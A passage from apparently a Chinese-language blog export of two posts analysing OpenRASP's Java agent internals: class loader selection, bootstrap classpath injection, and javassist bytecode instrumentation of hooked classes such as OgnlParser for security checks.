moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line">                <span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isCustomClassloader()) &#123;</span><br><span class="line">                moduleClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> moduleClassLoader.getClass().getDeclaredMethod(<span class="string">&quot;appendToClassPathForInstrumentation&quot;</span>, String.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    method.invoke(moduleClassLoader, originFile.getCanonicalPath());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    method.invoke(moduleClassLoader, originFile.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">                moduleClass = moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line">                <span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;[OpenRASP] Failed to initialize module jar: &quot;</span> + jarName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize module jar: &quot;</span> + jarName);</span><br><span class="line">        <span class="keyword">throw</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里的情况到底是在区分什么呢？</p><p>​在jdk8中，<em>AppClassLoader extends URLClassLoader</em>，<em>ExtClassLoader extends URLClassLoader</em>。</p><p>​在jdk9中，扩展机制被移除，Java 类库就已天然地满足了可扩展的需求，那自然无须再保留 <JAVA_HOME>\lib\ext 目录，为了向后兼容被重命名为平台类加载器<em>PlatformClassLoader，AppClassLoader</em>、<em>PlatformClassLoader extends BuiltinClassLoader</em>，不再是URLClassLoader。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.getSystemClassLoader() <span class="keyword">instanceof</span> URLClassLoader) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//如果系统类加载器是URLClassLoader的实例，则把rasp-engine.jar路径也添加到系统类加载器和扩展类加载器上；</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isCustomClassloader()) &#123;</span><br><span class="line">    moduleClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">    <span class="comment">//如果系统类加载器是JDK9/11、Weblogic的类加载器，则用系统类加载器覆盖moduleClassLoader，并将rasp-enginer路径添加到moduleClassLoader类加载器上。</span></span><br><span class="line">    ...</span><br><span class="line">&#125;  </span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否是weblogic或者jdk9、10和11</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCustomClassloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getClass().getName();</span><br><span class="line">        <span class="keyword">if</span> (classLoader.startsWith(<span class="string">&quot;com.oracle&quot;</span>) &amp;&amp; classLoader.contains(<span class="string">&quot;weblogic&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isModularityJdk();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​因为加载并实例化rasp-engine.jar的入口类EngineBoot时，都是先获取ModuleLoader.moduleClassLoader属性，用该加载器完成类加载。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">moduleClass = moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line"><span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br></pre></td></tr></table></figure><p>​现在moduleClassLoader为ModuleLoader静态代码块获取到的ExtClassLoader，或者是jdk9中的PlatformClassLoader，分情况讨论：</p><p>​如果系统类加载器（AppClassLoader，默认类加载器）就是URLClassLoader子类实例的话，说明是JDK8，就直接用moduleClassLoader中寄存的ExtClassLoader加载；</p><p>​如果系统类加载器是Weblogic或者jdk9、11的加载器的话，就将moduleClassLoader覆盖为系统类加载器。可能是因为，后面这几个加载器提供了唯一位置，功效就能和ExtClassLoader一样。jdk9以后类加载机制有模块化参与，那么只需要moduleClassLoader设为当前系统类加载器，系统类能根据moduleClassLoader反射加载rasp-engine中的类；应用类也能通过双亲委派机制中的模块化加载到rasp-engine中的类，不会受应用隔离的影响。</p><h2 id="获取hook类信息"><a href="#获取hook类信息" class="headerlink" title="获取hook类信息"></a>获取hook类信息</h2><p>​在“OpenRASP主线逻辑”中，我们将AbstractClassHook抽象类的子类称为hook类，他们是OpenRASP实现检测逻辑的关键。</p><blockquote><p>​hook类的作用是，在类加载时，在类的指定方法中插入检测代码，在类的该方法执行时，检测代码会通过反射执行hook类的某些方法，从而对该类的传参进行检查。</p></blockquote><p>​我们在应用类OgnlParser加载时，在其topLevelExpression方法中插入检测代码，在OgnlParser类的topLevelExpression方法执行时，检测代码会通过反射执行OgnlHook类的checkOgnlExpression方法，从而对该类的属性进行检查。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">    insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">node = <span class="keyword">new</span> <span class="title class_">OgnlParser</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(expression)).topLevelExpression()</span><br></pre></td></tr></table></figure><p>​插入的检测代码，是反射执行hook类的指定方法，那应用类<em>ognl&#x2F;OgnlParser</em>或者<em>java&#x2F;io&#x2F;ObjectInputStream</em>系统类，是如何获取到rasp-engine.jar中的hook类信息的呢？可以查看AbstractClassHook$getInvokeStaticSrc中生成的检测代码，如果拦截类是系统类，插入的检测代码是反射获取moduleClassLoader，加载rasp-engine.jar中的hook类；如果拦截类是应用类，就默认已经获取该hook类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.baidu.openrasp.hook/AbstractClassHook:</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取调用静态方法的代码字符串</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> invokeClass 静态方法所属的类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodName  静态方法名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> paramString 调用传入的参数字符串,按照javassist格式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 整合之后的代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">if</span> (isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName +</span><br><span class="line">                <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src += (<span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src += <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h2><p>1.把rasp.jar添加到BootStrap路径，这样当某加载器加载某类时（不管是系统类还是应用类，该类被插入一段字节码后，需要加载这段字节码中的rasp类），通过双亲委派机制一直向上层委派，最终必然能通过BootStrapClassLoader加载到rasp类。</p><p>2.OpenRASP用扩展类加载器加载rasp-engine.jar，</p><p>​a.使得要监控的系统类（“java&#x2F;io&#x2F;ObjectInputStream”）加载其中插入的rasp-engine代码时，只需要先通过BootStrapClassLoader加载的rasp.jar中的com.baidu.openrasp.ModuleLoader保存的moduleClassLoader中的扩展类加载器，加载rasp-engine.jar中的hook类。</p><p>​b.使得要监控的应用类（“ognl&#x2F;OgnlParser”）加载其中插入的rasp-engine代码时，只需要在隐式加载中利用双亲委派机制向上委派，通过扩展类加载器加载rasp-engine.jar中的hook类。</p><blockquote><p>显示加载：Class.forName和classLoader.loadClass等方式加载。</p><p>隐式加载：A类是被类加载器ClassLoaderA加载的，然后A类中import了B类，并且在A类的构造方法中，调用了B类的某个field或method，那么，在A类被实例化前，JVM会默认通过类加载器ClassLoaderA去把B类也加载进JVM。</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>以OpenRASP为基础-展开来港港RASP的类加载</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/8148</span></span><br><span class="line"><span class="number">2.</span>探秘Java9之类加载</span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903573306736654</span></span><br><span class="line"><span class="number">3.</span>OpenRASP浅析</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/11803</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP主线逻辑</title>
      <link href="/2022/11/25/OpenRASP%E4%B8%BB%E7%BA%BF%E9%80%BB%E8%BE%91/"/>
      <url>/2022/11/25/OpenRASP%E4%B8%BB%E7%BA%BF%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP主线逻辑"><a href="#OpenRASP主线逻辑" class="headerlink" title="OpenRASP主线逻辑"></a>OpenRASP主线逻辑</h1><p>​在Java Agent文章的最后，我抱着这样的疑问：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">agent程序是在类加载时修改字节码，怎么样实现对方法调用的监控？是修改字节码时修改了目标类的方法，使得该方法被调用时能传递信息给外部程序记录，云控就是在这个位置吗？还是有方法调用相关的JVMTI事件，从而能挂上方法调用相关的回调接口？</span><br></pre></td></tr></table></figure><p>​本篇文章就来解决该疑问，归纳OpenRASP启动后的主线逻辑，为接下来深入OpenRASP类加载、字节码修改、hook函数、云控、js检测规则等细节打上锚点。</p><h2 id="rasp-jar"><a href="#rasp-jar" class="headerlink" title="rasp.jar"></a>rasp.jar</h2><p>​OpenRASP有Agent和Attach两种启动方式，入口类是com.baidu.openrasp.Agent，根据Java Agent，以Agent模式启动时会调用premain方法，以Attach模式启动时会调用agentmain方法，这两种方法都会调用Agent$init。该方法实现如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String mode, String action, Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFileHelper.addJarToBootstrap(inst);</span><br><span class="line">        readVersion();<span class="comment">//读取MANIFEST.MF相关信息</span></span><br><span class="line">        ModuleLoader.load(mode, action, inst);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize, will continue without security protection.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.addJarToBootstrap(inst)：将rasp.jar添加到BootStrap classpath，这样做目的是，被hook的系统类或是应用类都能通过双亲委派机制找到OpenRASP中的hook类；</p><p>2.ModuleLoader.load(mode, action, inst)调用栈为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ModuleLoader类的<span class="keyword">static</span>代码块获取到ExtClassLoader，并寄存在类属性moduleClassLoader</span><br><span class="line">-&gt; 调用静态方法ModuleLoader.load，其调用构造函数<span class="keyword">new</span> <span class="title class_">ModuleLoader</span>(mode, inst)；</span><br><span class="line">-&gt;  在构造函数中，先实例化容器类<span class="keyword">new</span> <span class="title class_">ModuleContainer</span>，其通过ExtClassLoader加载rasp-engine.jar，并将入口类实例赋给类变量<span class="keyword">module</span>，ModuleContainer$start方法实现是调用<span class="keyword">module</span>$start方法，从而调用EngineBoot$start。</span><br><span class="line">简言之，实现了加载rasp-engine.jar，并调用入口类EngineBoot$start，将执行流交给rasp-engine.jar。并将加载rasp-engine.jar的加载器寄存在rasp.jar的ModuleLoader.moduleClassLoader。</span><br></pre></td></tr></table></figure><p>​在我看来，OpenRASP用容器类封装对模块入口类的调用，而目前模块仅有rasp-engine.jar，为啥不直接耦合嘞。有关添加到BootStrap classpath、使用ExtClassLoader的原因，将在“OpenRASP类加载”进一步说明。接下来主线逻辑交给EngineBoot$start。</p><h2 id="rasp-engine-jar"><a href="#rasp-engine-jar" class="headerlink" title="rasp-engine.jar"></a>rasp-engine.jar</h2><p>​完成加载rasp-engine.jar后，可以知道OpenRASP中日志、插件、云控、V8、字节码修改逻辑都在rasp-engine.jar，而rasp.jar只是Java Agent的实现，以及做了模块化封装。com.baidu.openrasp.EngineBoot$start方法实现如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(String mode, Instrumentation inst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;\n\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;   ____                   ____  ___   _____ ____ \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;  / __ \\____  ___  ____  / __ \\/   | / ___// __ \\\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot; / / / / __ \\/ _ \\/ __ \\/ /_/ / /| | \\__ \\/ /_/ /\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;/ /_/ / /_/ /  __/ / / / _, _/ ___ |___/ / ____/ \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;\\____/ .___/\\___/_/ /_/_/ |_/_/  |_/____/_/      \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;    /_/                                          \n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//V8初始化</span></span><br><span class="line">        Loader.load();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[OpenRASP] Failed to load native library, please refer to https://rasp.baidu.com/doc/install/software.html#faq-v8-load for possible solutions.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//日志配置初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!loadConfig()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//缓存rasp的build信息</span></span><br><span class="line">    Agent.readVersion();</span><br><span class="line">    BuildRASPModel.initRaspInfo(Agent.projectVersion, Agent.buildTime, Agent.gitCommit);</span><br><span class="line">    <span class="comment">// 插件系统初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!JS.Initialize()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//hook点管理初始化</span></span><br><span class="line">    CheckerManager.init();</span><br><span class="line">    <span class="comment">//字节码转换器初始化</span></span><br><span class="line">    initTransformer(inst);</span><br><span class="line">    <span class="keyword">if</span> (CloudUtils.checkCloudControlEnter()) &#123;</span><br><span class="line">        CrashReporter.install(Config.getConfig().getCloudAddress() + <span class="string">&quot;/v1/agent/crash/report&quot;</span>,</span><br><span class="line">                              Config.getConfig().getCloudAppId(), Config.getConfig().getCloudAppSecret(),</span><br><span class="line">                              CloudCacheModel.getInstance().getRaspId());</span><br><span class="line">    &#125;</span><br><span class="line">    deleteTmpDir();</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;[OpenRASP] Engine Initialized [&quot;</span> + Agent.projectVersion + <span class="string">&quot; (build: GitCommit=&quot;</span></span><br><span class="line">        + Agent.gitCommit + <span class="string">&quot; date=&quot;</span> + Agent.buildTime + <span class="string">&quot;)]&quot;</span>;</span><br><span class="line">    System.out.println(message);</span><br><span class="line">    Logger.getLogger(EngineBoot.class.getName()).info(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在EngineBoot$start中依次完成V8引擎、配置（包括日志、云控、syslog服务配置）、插件系统、hook点管理以及字节码转换器的初始化，接下来分析CheckerManager$init和initTransformer(inst)，理清OpenRASP怎样实现对方法调用的监控。</p><p>​CheckerManager类用于管理hook点，代码中Type为CheckParameter内部枚举类，定义了不同攻击类型对应的检测器（分为V8、Java本地以及基线检测器3类）。CheckerManager$init执行时，就是遍历checkerCheckParameter的Type，将其中元素添加进枚举映射checkers中，CheckerManager.checkers是静态变量，供接下来直接使用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /plugin/checker/CheckerManager.java：</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> EnumMap&lt;Type, Checker&gt; checkers = <span class="keyword">new</span> <span class="title class_">EnumMap</span>&lt;Type, Checker&gt;(Type.class);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">for</span> (Type type : Type.values()) &#123;</span><br><span class="line">        checkers.put(type, type.checker);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /plugin/checker/CheckParameter.java：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Type</span> &#123;</span><br><span class="line">        <span class="comment">// js插件检测</span></span><br><span class="line">        SQL(<span class="string">&quot;sql&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// java本地检测</span></span><br><span class="line">    SQL_SLOW_QUERY(<span class="string">&quot;sqlSlowQuery&quot;</span>, <span class="keyword">new</span> <span class="title class_">SqlResultChecker</span>(<span class="literal">false</span>), <span class="number">0</span>),</span><br><span class="line">    <span class="comment">// 安全基线检测</span></span><br><span class="line">    POLICY_LOG(<span class="string">&quot;log&quot;</span>, <span class="keyword">new</span> <span class="title class_">LogChecker</span>(<span class="literal">false</span>), <span class="number">1</span> &lt;&lt; <span class="number">22</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><p>​initTransformer(inst)用于管理字节码转换器，CustomClassTransformer是OpenRASP唯一实现的ClassFileTransformer。根据Java Agent，inst.addTransformer将ClassFileTransformer实现类实例加入JVM，之后有新的类被JVM加载时，JVM会自动回调该转换器实例的transform方法。initTransformer(inst)调用了transformer.retransform，这是对已经加载的类进行重新转换，对于已经被加载的类，会经由retransform方法到transform。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// EngineBoot:</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initTransformer</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">CustomClassTransformer</span>(inst);</span><br><span class="line">    transformer.retransform();</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /transformer/CustomClassTransformer:</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CustomClassTransformer</span><span class="params">(Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.inst = inst;</span><br><span class="line">    inst.addTransformer(<span class="built_in">this</span>, <span class="literal">true</span>);</span><br><span class="line">    addAnnotationHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在CustomClassTransformer构造函数中调用的addAnnotationHook方法，会读取hook包中所有被@HookAnnotation注解的class，然后缓存到HashSet<AbstractClassHook> CustomClassTransformer.hooks，这些类继承了AbstractClassHook，我称他们为hook类。</p><blockquote><p>​hook类的作用是，在类加载时，在类的指定方法中插入检测代码，在类的该方法执行时，检测代码会通过反射执行hook类的某些方法，从而对该类的传参进行检查。</p></blockquote><p>​对于CustomClassTransformer类，我们知道transform方法是回调方法，是实现该接口的关键。在CustomClassTransformer$transform方法中，会遍历hooks中所有缓存的hook类，先判断当前拦截类是否匹配这些hook类，如果是就利用javassit创建ctClass，接着调用该hook类的transformClass方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /transformer/CustomClassTransformer:</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                        ProtectionDomain domain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span>) &#123;</span><br><span class="line">        DependencyFinder.addJarPath(domain);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span> &amp;&amp; jspClassLoaderNames.contains(loader.getClass().getName())) &#123;</span><br><span class="line">        jspClassLoaderCache.put(className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;ClassLoader&gt;(loader));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> AbstractClassHook hook : hooks) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hook.isClassMatched(className)) &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">                addLoader(classPool, loader);</span><br><span class="line">                ctClass = classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">                    hook.setLoadedByBootstrapLoader(<span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                classfileBuffer = hook.transformClass(ctClass);</span><br><span class="line">                <span class="keyword">if</span> (classfileBuffer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    checkNecessaryHookType(hook.getType());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    ctClass.detach();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    serverDetector.detectServer(className, loader, domain);</span><br><span class="line">    <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>​transformClass是AbstractClassHook抽象类的方法，会调用hookMethod抽象方法。不同的hook类重写了AbstractClassHook的hookMethod，接下来以OgnlHook类为例。</p><p>​继承AbstractClassHook的OgnlHook类，实现该hookMethod抽象方法时，先通过getInvokeStaticSrc方法生成需要插入到代码中的字节码，然后调用inserAfter方法将字节码插入到hook点的后面。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">    insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插桩部分"><a href="#插桩部分" class="headerlink" title="插桩部分"></a>插桩部分</h3><p>​看一下插入的字节码是如何生成的？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,<span class="string">&quot;$_&quot;</span>, Object.class);</span><br></pre></td></tr></table></figure><p>​getInvokeStaticSrc用于构造payload，返回一段关于反射执行的代码，即被插入的类方法在执行时，会反射得到当前hook类OgnlHook，调用methodName所指定的方法checkOgnlExpression，即执行OgnlHook$checkOgnlExpression。</p><p>​回想这些方法调用，都是CustomClassTransformer$transform方法拦截到当前类，判断当前类是否在hook类中才进行操作。所以上面调用getInvokeStaticSrc生成字节码后，inserAfter就把这段字节码插入到当前类ctClass的某些方法上了。</p><p>​整个过程，是openRASP拦截到类加载，通过ognlHook判断ognl&#x2F;OgnlParser类是我们需要关注的类，把一段代码插桩到OgnlParser类的某些方法上；当OgnlParser类的这些方法被调用时，就会反射获取ognlHook实例，并调用其checkOgnlExpression，以执行相应的检测逻辑。</p><p>​看一下到底把字节码插到类的哪些方法上？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(CtClass ctClass, String methodName, String desc, String src, <span class="type">boolean</span> asFinally)</span>；</span><br><span class="line">官方注释：</span><br><span class="line">ctClass 目标类；methodName 目标方法名称；desc 目标方法的描述符号；src 要插入的源代码；asFinally 是否在抛出异常的时候同样执行该源代码。</span><br></pre></td></tr></table></figure><p>​在ognl类案例中，目标方法名称为”topLevelExpression”，这是OgnlParser类业务代码中可以方便得到传参expression的地方：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">node = <span class="keyword">new</span> <span class="title class_">OgnlParser</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(expression)).topLevelExpression()</span><br></pre></td></tr></table></figure><h3 id="V8部分"><a href="#V8部分" class="headerlink" title="V8部分"></a>V8部分</h3><p>​在OgnlParser$topLevelExpression方法被调用时，会反射执行OgnlHook$checkOgnlExpression方法。该方法会调用HookHandler.doCheck(CheckParameter.Type.OGNL, params)，经过关于云控和负载的统一检查后，最终来到CheckerManager.check(type, parameter)。</p><figure class="highlight 